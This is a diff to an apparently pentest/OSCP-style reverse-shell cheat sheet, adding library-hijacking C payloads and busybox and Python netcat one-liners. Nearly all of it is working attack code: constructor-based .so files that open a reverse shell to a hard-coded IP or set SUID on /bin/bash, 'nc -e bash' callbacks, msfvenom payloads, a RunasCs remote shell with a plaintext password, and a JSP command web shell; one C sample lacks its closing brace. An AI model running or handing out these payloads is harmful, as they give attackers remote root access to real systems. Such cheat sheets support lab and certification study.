@@ -89,6 +89,58 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh > shell
 msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll > shell.dll
 ```
 
+#### ➤ .so
+
+reference : 
+https://routezero.security/2025/02/19/proving-grounds-practice-dev_working-walkthrough/
+https://medium.com/@carlosbudiman/oscp-proving-grounds-dev-working-intermediate-linux-cd59f01b42c9
+
+Code example 01 (lib_backup.c): Reverse shell
+```
+Code :
+#include <stdio.h>  
+#include <stdlib.h>  
+#include <sys/types.h>  
+#include <unistd.h>  
+  
+static void advance_backup_custom_implementation() __attribute__((constructor));  
+  
+void advance_backup_custom_implementation() {  
+ setuid(0);  
+ setgid(0);  
+ printf("Reverse Shell via library hijacking... \n");  
+ const char *ncshell = "busybox nc 192.168.45.197 80 -e /bin/bash";  
+ system(ncshell);  
+
+Exploitation :
+gcc -shared -fPIC -o lib_backup.so lib_backup.c
+```
+
+Code example 02 (lib_backup.c): Create SUID on bash
+```
+Code :
+#include <stdio.h>  
+#include <stdlib.h>  
+#include <sys/types.h>  
+#include <unistd.h>  
+  
+static void advance_backup_custom_implementation() __attribute__((constructor));  
+  
+void advance_backup_custom_implementation() {  
+ setuid(0);  
+ setgid(0);  
+ printf("Reverse Shell via library hijacking... \n");  
+ system("chmod 4777 /bin/bash");  
+}
+
+Exploitation :
+gcc -Wall -fPIC -c lib_backup.c -o lib_backup.o
+gcc -shared lib_backup.o -o lib_backup.so
+
+Once SUID activated, only perform :
+/bin/bash -p
+```
+
 #### ➤ Upload and execution
 ```
 # This reverse shell download a reverse shell name Invoke-PowerShellTcp.ps1 and execute it to obtain a reverse shell
@@ -118,6 +170,15 @@ Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
 
 Reverse shell :
 Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command cmd.exe -Remote 192.168.49.55:443
+```
+
+
+#### ➤ Busybox
+
+Busybox may be installed on the victim linux machine and it is deployed directly with netcat.
+
+```
+busybox nc 192.168.0.10 80 -e bash
 ```
 
 #### ➤ NC
@@ -154,7 +215,14 @@ In this case, use the nc32 version rather than nc64 version
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ```
 
+#### ➤ Python
 
+```
+Example 01 :
+
+import os
+os.system("busybox nc 192.168.45.154 3306 -e bash")
+```
 
 ## 🔻Online Generator
 https://www.revshells.com/
